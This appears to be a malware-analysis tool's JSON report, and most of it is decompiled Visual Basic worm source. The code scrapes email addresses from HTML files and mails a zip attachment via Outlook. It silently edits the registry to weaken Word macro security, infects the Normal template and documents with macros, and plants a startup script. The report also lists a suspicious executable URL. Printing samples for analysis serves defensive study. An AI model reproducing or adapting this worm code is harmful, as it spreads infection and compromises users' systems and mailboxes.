            "Set fso = CreateObject(\"Scripting.FileSystemObject\")",
            "Set cfh = fso.GetFolder(dir).Files",
            "For Each filh In cfh",
            "ext = fso.GetExtensionName(filh.path)",
            "ext = LCase(ext)",
            "If (ext = \"htm\") Or (ext = \"html\") Then",
            "Open filh.path For Input As #1",
            "Do While Not EOF(1)",
            "Line Input #1, textline",
            "q = q & textline",
            "Loop",
            "Close #1",
            "For j = 1 To Len(q)",
            "If Mid(q, j, 7) = \"mailto:\" Then",
            "mlto = \"\"",
            "cnt = 0",
            "Do While Mid(q, j + 7 + cnt, 1) <> \"\"\"\"",
            "mlto = mlto + Mid(q, j + 7 + cnt, 1)",
            "cnt = cnt + 1",
            "Loop",
            "Call Worming(mlto)",
            "End If",
            "Next",
            "End If",
            "Next",
            "End Sub",
            "Function Worming(mail As String)",
            "On Error Resume Next",
            "Dim a, b, c",
            "Set a = CreateObject(\"Outlook.Application\")",
            "Set b = a.GetNameSpace(\"MAPI\")",
            "If a = \"Outlook\" Then",
            "b.Logon \"profile\", \"password\"",
            "Set c = a.CreateItem(0)",
            "c.Recipients.Add mail",
            "c.Subject = \"check us out\"",
            "c.Body = \"we exist to give everyone a smiley face... :)\"",
            "c.Attachments.Add \"c:\\brigada8.zip\"",
            "c.Send",
            "c.DeleteAfterSubmit = True",
            "b.Logoff",
            "End If",
            "End Function",
            "'--------------------commandline parser-----------------------------",
            "Private Function GetCommLine() As String",
            "    Dim RetStr As Long, SLen As Long",
            "    Dim Buffer As String",
            "    RetStr = GetCommandLine",
            "    SLen = lstrlen(RetStr)",
            "    If SLen > 0 Then",
            "        GetCommLine = Space$(SLen)",
            "        CopyMemory ByVal GetCommLine, ByVal RetStr, SLen",
            "    End If",
            "End Function",
            "'--------------------get special folder-----------------------------",
            "Private Function GetSpecialfolder(CSIDL As Long) As String",
            "    Dim r As Long",
            "    Dim IDL As ITEMIDLIST",
            "    Dim path As String",
            "    r = SHGetSpecialFolderLocation(100, CSIDL, IDL)",
            "    If r = 0 Then",
            "        path$ = Space$(512)",
            "        r = SHGetPathFromIDList(ByVal IDL.mkid.cb, ByVal path$)",
            "        GetSpecialfolder = Left$(path, InStr(path, Chr$(0)) - 1)",
            "        Exit Function",
            "    End If",
            "    GetSpecialfolder = \"\"",
            "End Function",
            "'------------------ document infection ---------------------------",
            "Sub wording()",
            "On Error Resume Next",
            "Dim vdir As String",
            "vdir = App.path",
            "If Right(vdir, 1) <> \"\\\" Then vdir = vdir & \"\\\"",
            "FileCopy vdir & App.EXEName & \".exe\", \"c:\\XXXview.exe\"",
            "Open \"c:\\v.r\" For Output As #2",
            "Print #2, \"REGEDIT4\"",
            "Print #2, \"[HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\9.0\\Word\\Security]\"",
            "Print #2, \"\"\"Level\"\"=dword:00000001\"",
            "Print #2, \"[HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\10.0\\Word\\Security]\"",
            "Print #2, \"\"\"Level\"\"=dword:00000001\"",
            "Print #2, \"\"\"AccessVBOM\"\"=dword:00000001\"",
            "Close #2",
            "Shell \"c:\\regedit.exe /s c:\\v.r\", vbHide",
            "Kill \"c:\\v.r\"",
            "Open \"c:\\nl.tmp\" For Output As #9",
            "Print #9, \"Sub document_close()\"",
            "Print #9, \"On Error Resume Next\"",
            "Print #9, \"Open \"\"c:\\xp.exp\"\" For Output As 2\"",
            "Print #9, \"Print #2, \"\"sub document_open()\"\"\"",
            "Print #9, \"Print #2, \"\"On Error Resume Next\"\"\"",
            "Print #9, \"Print #2, \"\"jbo = ActiveDocument.Shapes(1).OLEFormat.ClassType\"\"\"",
            "Print #9, \"Print #2, \"\"With ActiveDocument.Shapes(1).OLEFormat\"\"\"",
            "Print #9, \"Print #2, \"\"    .ActivateAs ClassType:=jbo\"\"\"",
            "Print #9, \"Print #2, \"\"    .Activate\"\"\"",
            "Print #9, \"Print #2, \"\"End With\"\"\"",
            "Print #9, \"Print #2, \"\"end sub\"\"\"",
            "Print #9, \"Close 2\"",
            "Print #9, \"Set fso = CreateObject(\"\"Scripting.FileSystemObject\"\")\"",
            "Print #9, \"Set nt = ActiveDocument.VBProject.vbcomponents(1).codemodule\"",
            "Print #9, \"Set iw = fso.OpenTextFile(\"\"c:\\xp.exp\"\", 1, True)\"",
            "Print #9, \"nt.DeleteLines 1, nt.CountOfLines\"",
            "Print #9, \"i = 1\"",
            "Print #9, \"Do While iw.atendofstream <> True\"",
            "Print #9, \"b = iw.readline\"",
            "Print #9, \"nt.InsertLines i, b\"",
            "Print #9, \"i = i + 1\"",
            "Print #9, \"Loop\"",
            "Print #9, \"ActiveDocument.Shapes.AddOLEObject _\"",
            "Print #9, \"FileName:=\"\"c:\\XXXview.exe\"\", _\"",
            "Print #9, \"LinkToFile:=False\"",
            "Print #9, \"ActiveDocument.Save\"",
            "Print #9, \"Open \"\"c:\\b8.r\"\" For Output As #3\"",
            "Print #9, \"Print #3, \"\"REGEDIT4\"\"\"",
            "Print #9, \"Print #3, \"\"[HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\9.0\\Word\\Security]\"\"\"",
            "Print #9, \"Print #3, \"\"\"\"\"\"Level\"\"\"\"=dword:00000001\"\"\"",
            "Print #9, \"Print #3, \"\"[HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\10.0\\Word\\Security]\"\"\"",
            "Print #9, \"Print #3, \"\"\"\"\"\"Level\"\"\"\"=dword:00000001\"\"\"",
            "Print #9, \"Print #3, \"\"\"\"\"\"AccessVBOM\"\"\"\"=dword:00000001\"\"\"",
            "Print #9, \"Close #3\"",
            "Print #9, \"Shell \"\"c:\\regedit.exe /s c:\\b8.r\"\", vbHide\"",
            "Print #9, \"Kill \"\"c:\\b8.r\"\"\"",
            "Print #9, \"End Sub\"",
            "Close #9",
            "Open GetSpecialfolder(CSIDL_STARTUP) & \"\\startup.vbs\" For Output As #6",
            "Print #6, \"On Error Resume Next\"",
            "Print #6, \"Set fso = CreateObject(\"\"Scripting.FileSystemObject\"\")\"",
            "Print #6, \"Set oword = CreateObject(\"\"Word.Application\"\")\"",
            "Print #6, \"oword.Visible = False\"",
            "Print #6, \"Set nt = oword.NormalTemplate.vbproject.vbcomponents(1).codemodule\"",
            "Print #6, \"Set iw = fso.OpenTextFile(\"\"c:\\nl.tmp\"\", 1, True)\"",
            "Print #6, \"nt.DeleteLines 1, nt.CountOfLines\"",
            "Print #6, \"i = 1\"",
            "Print #6, \"Do While iw.atendofstream <> True\"",
            "Print #6, \"b = iw.readline\"",
            "Print #6, \"nt.InsertLines i, b\"",
            "Print #6, \"i = i + 1\"",
            "Print #6, \"Loop\"",
            "Print #6, \"oword.NormalTemplate.Save\"",
            "Print #6, \"oword.NormalTemplate.Close\"",
            "Print #6, \"oword.quit\"",
            "Close #6",
            "End Sub"
        ],
        "file": {},
        "fuzzing": {},
        "ip": [],
        "url": [
            "http://p0th0le.tripod.com/a.exe"
        ]
    },
    "time": "0:00:00.398008",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": []
}
